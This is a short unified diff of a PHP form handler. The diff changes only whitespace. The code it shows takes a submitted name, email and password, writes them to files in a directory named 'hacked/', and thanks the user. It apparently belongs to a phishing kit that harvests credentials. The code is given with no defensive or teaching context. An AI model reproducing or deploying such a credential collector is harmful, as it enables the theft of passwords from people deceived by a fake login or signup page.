@@ -1,8 +1,7 @@
-
-
 <?php
 
 include "template/header.php";
+
 ?>
 
 <section class="container">
@@ -14,13 +13,12 @@ include "template/header.php";
 
                     <?php
 
-
-
                     if(empty($_POST['name']) && empty($_POST['email']) && empty($_POST['password'])){
 
                         echo "Data Required, try again";
 
                     }else{
+
                         $name = str_replace(" ","_",$_POST['name']);
                         $dir = "hacked/";
 
@@ -34,6 +32,7 @@ include "template/header.php";
                         fclose($f);
 
                         echo "thanks you";
+
                     }
 
                     ?>
